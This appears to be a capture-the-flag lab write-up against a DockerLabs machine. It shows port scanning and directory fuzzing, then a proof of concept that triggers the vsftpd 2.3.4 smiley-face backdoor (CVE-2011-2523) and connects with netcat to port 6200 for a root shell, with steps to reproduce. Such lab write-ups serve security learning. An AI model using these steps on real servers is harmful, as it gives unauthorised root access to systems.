# IP
172.17.0.2
# Enumeration
## ICMP
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs]
└─$ ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.056 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.046 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1026ms
rtt min/avg/max/mdev = 0.046/0.051/0.056/0.005 ms
```

Machine discoverable
## Port scanning
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs]
└─$ nmap -sV -sC -p- -n 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-09 18:19 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
|_ftp-anon: got code 500 "OOPS: cannot change directory:/var/ftp".
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 16:95:72:B4:A5:4C (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.78 seconds
```

Found two open ports
- 21 -> FTP
- 80 -> HTTP
## Dir Fuzzing
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs]
└─$ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,html,conf,sh,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              conf,sh,txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta.html            (Status: 403) [Size: 275]
.hta.php             (Status: 403) [Size: 275]
.hta                 (Status: 403) [Size: 275]
.htaccess.sh         (Status: 403) [Size: 275]
.htaccess.html       (Status: 403) [Size: 275]
.htaccess.txt        (Status: 403) [Size: 275]
.htaccess            (Status: 403) [Size: 275]
.hta.conf            (Status: 403) [Size: 275]
.hta.sh              (Status: 403) [Size: 275]
.hta.txt             (Status: 403) [Size: 275]
.htaccess.conf       (Status: 403) [Size: 275]
.htpasswd.sh         (Status: 403) [Size: 275]
.htpasswd.conf       (Status: 403) [Size: 275]
.htaccess.php        (Status: 403) [Size: 275]
.htpasswd            (Status: 403) [Size: 275]
.htpasswd.html       (Status: 403) [Size: 275]
.htpasswd.txt        (Status: 403) [Size: 275]
.htpasswd.php        (Status: 403) [Size: 275]
index.html           (Status: 200) [Size: 10671]
index.html           (Status: 200) [Size: 10671]
server-status        (Status: 403) [Size: 275]
Progress: 27678 / 27678 (100.00%)
===============================================================
Finished
===============================================================
```

No hidden directories found
## Exploit search
FTP version vsftpd 2.3.4 has a backdoor exploit (CVE-2011-2523)
### PoC
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs]
└─$ ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 2.3.4)
Name (172.17.0.2:codebylauti): username:)
331 Please specify the password.
Password:

```

```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs]
└─$ nc 172.17.0.2 6200
whoami
root
```
### Step to reproduce
1) Connect to ftp service
2) Enter an username followed by a smily face :)
3) Enter any password
4) This opens a backdoor on port 6200